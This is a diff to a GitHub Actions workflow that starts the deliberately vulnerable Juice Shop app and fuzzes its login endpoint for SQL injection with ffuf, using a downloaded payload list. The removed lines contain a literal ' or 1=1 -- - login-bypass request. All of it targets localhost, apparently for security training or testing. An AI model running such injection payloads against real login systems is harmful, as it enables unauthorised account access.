@@ -14,34 +14,62 @@ jobs:
   ffuf:
     runs-on: ubuntu-latest
     services:
-        juice:
-          image: bkimminich/juice-shop
-          ports:
-            - 3000:3000
+      juice:
+        image: bkimminich/juice-shop
+        ports:
+          - 3000:3000
+
     steps:
       - name: Wait for service
         run: |
-            sleep 10 
-            curl --path-as-is -i -s -k -X $'POST' \
-              -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
-              --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
-              $'http://localhost:3000/rest/user/login'
+          echo "Waiting for Juice Shop to start..."
+          for i in $(seq 1 30); do
+            if curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/rest/user/login | grep -q "200\|401"; then
+              echo "Service is up."
+              break
+            fi
+            sleep 2
+          done
+          # Дополнительная проверка, что эндпоинт отвечает на POST
+          curl -s -X POST http://localhost:3000/rest/user/login \
+            -H "Content-Type: application/json" \
+            -d '{"email":"test@test.com","password":"test"}' || true
 
-      - name: Get payloads
+      - name: Get and prepare payloads
         run: |
-          wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection
-      
-      - name: Install fuzzing
+          # Скачиваем исходный список SQL-инъекций
+          wget -q https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection -O sql-injection-raw.txt
+          
+          # Очищаем словарь: убираем комментарии, пустые строки и возможные пробелы в начале/конце
+          grep -v '^#' sql-injection-raw.txt | sed '/^$/d' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' > sql-payloads.txt
+          
+          echo "Подготовлено payload'ов: $(wc -l < sql-payloads.txt)"
+          head -n 5 sql-payloads.txt
+
+      - name: Install ffuf
         run: |
           go install github.com/ffuf/ffuf/v2@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
 
-      - name: Run fuzzing
+      - name: Run ffuf SQL injection fuzzing
         run: |
-          $HOME/go/bin/ffuf || true
+          # Фаззим поле email в JSON-теле POST-запроса.
+          # Успешный вход в Juice Shop возвращает 200 и JSON с JWT (поле "authentication").
+          # Фильтруем ответы, содержащие сообщение об ошибке аутентификации.
+          ffuf -w sql-payloads.txt \
+            -u http://localhost:3000/rest/user/login \
+            -X POST \
+            -H "Content-Type: application/json" \
+            -d '{"email":"FUZZ","password":"pass"}' \
+            -mc 200 \
+            -fr '"message":"Invalid email or password"' \
+            -o ffuf-results.json \
+            -of json \
+            -v || true
 
-      - name: Get Logs from Service
+      - name: Get logs from Juice Shop service
         run: |
-          docker logs $(docker ps -q) > juice-logs.log
+          docker logs $(docker ps -q --filter "ancestor=bkimminich/juice-shop") > juice-logs.log 2>&1 || true
 
       - name: Upload results
         uses: actions/upload-artifact@v4
@@ -49,3 +77,5 @@ jobs:
           name: security-reports-bundle
           path: |
             juice-logs.log
+            ffuf-results.json
+            sql-payloads.txt
